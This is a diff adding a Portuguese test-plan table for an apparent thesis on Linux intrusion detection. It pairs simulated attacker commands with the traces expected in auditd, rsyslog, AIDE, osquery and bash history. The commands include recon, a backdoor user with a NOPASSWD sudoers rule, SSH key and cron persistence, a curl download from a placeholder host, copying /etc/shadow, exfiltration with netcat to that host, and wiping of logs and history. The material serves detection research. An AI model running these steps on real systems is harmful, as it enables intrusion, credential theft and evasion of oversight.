@@ -1,0 +1,36 @@
+id	fase	categoria	descricao	comando	usuario	esperado_auditd	esperado_rsyslog	esperado_aide	esperado_osquery	esperado_bash_history
+A01	a	acesso_inicial	Login via SSH com credencial valida	ssh alvo@IP_VITIMA	alvo	USER_LOGIN/USER_START do sshd	Accepted password for alvo (auth.log)	nao se aplica	last / logged_in_users	nao se aplica
+A02	a	reconhecimento	Usuario atual	whoami	alvo	execve whoami	nao	nao	nao	sim
+A03	a	reconhecimento	Identidade e grupos	id	alvo	execve id	nao	nao	nao	sim
+A04	a	reconhecimento	Informacoes do kernel	uname -a	alvo	execve uname	nao	nao	nao	sim
+A05	a	reconhecimento	Leitura de usuarios do sistema	cat /etc/passwd	alvo	execve cat (argumento /etc/passwd)	nao	nao	nao	sim
+A06	a	reconhecimento	Interfaces de rede	ip addr	alvo	execve ip	nao	nao	nao	sim
+A07	a	reconhecimento	Portas e conexoes	ss -tulpn	alvo	execve ss	nao	nao	nao	sim
+A08	a	reconhecimento	Busca de binarios SUID	find / -perm -4000 -type f 2>/dev/null	alvo	execve find	nao	nao	nao	sim
+A09	a	reconhecimento	Listagem de diretorios de interesse	ls -la /home /opt /tmp	alvo	execve ls	nao	nao	nao	sim
+B01	b	persistencia	Criacao de usuario	sudo useradd -m -s /bin/bash invasor_teste	alvo	execve useradd; escrita em /etc/passwd /etc/shadow /etc/group (watch)	sudo COMMAND=useradd; useradd new user/new group	passwd/shadow/group alterados; /home/invasor_teste adicionado	users (novo usuario)	sim
+B02	b	persistencia	Inclusao no grupo sudo	sudo usermod -aG sudo invasor_teste	alvo	execve usermod; escrita em /etc/group /etc/gshadow	sudo COMMAND=usermod; usermod add to group	group/gshadow alterados	nao (users nao mostra grupos)	sim
+B03	b	persistencia	Chave SSH autorizada	mkdir -p ~/.ssh && echo 'CHAVE_PUBLICA_TESTE' >> ~/.ssh/authorized_keys	alvo	execve mkdir; escrita em /home (watch)	nao	~/.ssh/authorized_keys adicionado	authorized_keys (nova chave)	sim
+B04	b	persistencia	Script de manutencao de acesso	mkdir -p ~/.cache && printf '#!/bin/sh\nexit 0\n' > ~/.cache/.atualiza.sh && chmod +x ~/.cache/.atualiza.sh	alvo	execve chmod; escrita em /home; chmod (permissoes)	nao	~/.cache/.atualiza.sh adicionado	arquivos_ocultos	sim
+B05	b	persistencia	Tarefa agendada (cron)	(crontab -l 2>/dev/null; echo '*/5 * * * * /home/alvo/.cache/.atualiza.sh') | crontab -	alvo	execve crontab; escrita em /var/spool/cron (watch)	crontab REPLACE (syslog/cron)	/var/spool/cron/crontabs/alvo adicionado	crontab (nova entrada)	sim
+B06	b	persistencia	Persistencia no shell do usuario	echo 'alias ls="ls --color=auto"' >> ~/.bashrc	alvo	escrita em /home (watch)	nao	~/.bashrc alterado	nao	sim
+C01	c	manipulacao_arquivos	Diretorio oculto	mkdir -p ~/.cache/.ferramentas	alvo	execve mkdir; escrita em /home	nao	diretorio adicionado	arquivos_ocultos	sim
+C02	c	manipulacao_arquivos	Download de ferramenta simulada	curl -s -o ~/.cache/.ferramentas/ferramenta.sh http://IP_HOSPEDEIRO:8000/ferramenta.sh	alvo	execve curl; connect (rede); escrita em /home	nao	arquivo adicionado	nao (conexao curta)	sim
+C03	c	manipulacao_arquivos	Permissao de execucao	chmod +x ~/.cache/.ferramentas/ferramenta.sh	alvo	execve chmod; fchmodat (permissoes)	nao	permissao alterada	nao	sim
+C04	c	manipulacao_arquivos	Copia para /tmp	cp ~/.cache/.ferramentas/ferramenta.sh /tmp/backdoor.sh	alvo	execve cp; escrita em /tmp (watch)	nao	nao (removido em F01)	nao	sim
+C05	c	manipulacao_arquivos	Alteracao de configuracao de servico	sudo sh -c 'echo "# alteracao tcc" >> /etc/ssh/sshd_config'	alvo	execve sh; escrita em /etc/ssh/sshd_config (watch)	sudo COMMAND=/bin/sh	/etc/ssh/sshd_config alterado	nao	sim
+D01	d	escalacao	Tentativa sem privilegio a arquivo restrito	cat /etc/shadow	alvo	openat negado (EACCES) em /etc/shadow	nao	nao	nao	sim
+D02	d	escalacao	Listagem de privilegios	sudo -l	alvo	execve sudo	sudo session	nao	nao	sim
+D03	d	escalacao	Leitura privilegiada	sudo cat /etc/shadow	alvo	execve cat com euid 0	sudo COMMAND=/usr/bin/cat /etc/shadow	nao (somente leitura)	nao	sim
+D04	d	escalacao	Regra de privilegio em sudoers.d	echo 'invasor_teste ALL=(ALL) NOPASSWD:ALL' | sudo tee /etc/sudoers.d/invasor_teste && sudo chmod 440 /etc/sudoers.d/invasor_teste	alvo	execve tee/chmod; escrita em /etc/sudoers.d (watch)	sudo COMMAND=tee; sudo COMMAND=chmod	/etc/sudoers.d/invasor_teste adicionado	sudoers (nova regra)	sim
+D05	d	escalacao	Uso da conta criada como root	sudo -u invasor_teste sudo -n id	alvo	execve sudo/id (auid de alvo)	sudo alvo->invasor_teste; invasor_teste->root	nao	nao	sim
+E01	e	exfiltracao	Preparacao de diretorio de exfiltracao	mkdir -p /tmp/.exf && cp -r ~/dados_simulados /tmp/.exf/	alvo	execve cp; escrita em /tmp	nao	nao (removido em F01)	nao	sim
+E02	e	exfiltracao	Copia de arquivo sensivel	sudo cp /etc/shadow /tmp/.exf/shadow.copia && sudo chown alvo /tmp/.exf/shadow.copia	alvo	execve cp/chown; chown (dono)	sudo COMMAND=cp; sudo COMMAND=chown	nao (removido em F01)	nao	sim
+E03	e	exfiltracao	Compactacao	tar czf /tmp/.exf/pacote.tar.gz -C /tmp/.exf dados_simulados shadow.copia	alvo	execve tar (e gzip)	nao	nao (removido em F01)	nao	sim
+E04	e	exfiltracao	Transferencia via netcat	nc -N IP_HOSPEDEIRO 9001 < /tmp/.exf/pacote.tar.gz	alvo	execve nc; connect para IP_HOSPEDEIRO:9001	nao	nao	nao (conexao curta)	sim
+X01	coleta	coleta_intermediaria	Captura intermediaria do Osquery na sessao SSH do pesquisador. NAO e acao do atacante	sudo /root/tcc-scripts/snapshot_osquery.sh durante	pesquisador	eventos com auid do pesquisador (excluir da analise)	sudo do pesquisador (excluir da analise)	nao	snapshot durante	nao
+F01	f	limpeza	Remocao de arquivos temporarios	rm -rf /tmp/.exf /tmp/backdoor.sh	alvo	execve rm; unlink em /tmp (watch)	nao	nao (arquivos nao existiam na baseline)	nao	sim
+F02	f	limpeza	Remocao seletiva de linhas do auth.log	sudo sed -i '/invasor_teste/d' /var/log/auth.log	alvo	execve sed; escrita em /var/log (regra dir)	linhas removidas (o registro do proprio sed pode permanecer)	auth.log alterado (se monitorado)	nao	sim
+F03	f	limpeza	Tentativa de remover regras de auditoria	sudo auditctl -D	alvo	execve auditctl; falha por -e 2	sudo COMMAND=auditctl -D	nao	nao	sim
+F04	f	limpeza	Limpeza do historico	history -c && history -w	alvo	nao (builtin do bash; somente escrita em /home)	nao	~/.bash_history alterado	shell_history (vazio)	nao (apagado)
+F05	f	limpeza	Encerramento da sessao	exit	alvo	USER_END / CRED_DISP	session closed for user alvo	nao	logged_in_users	nao
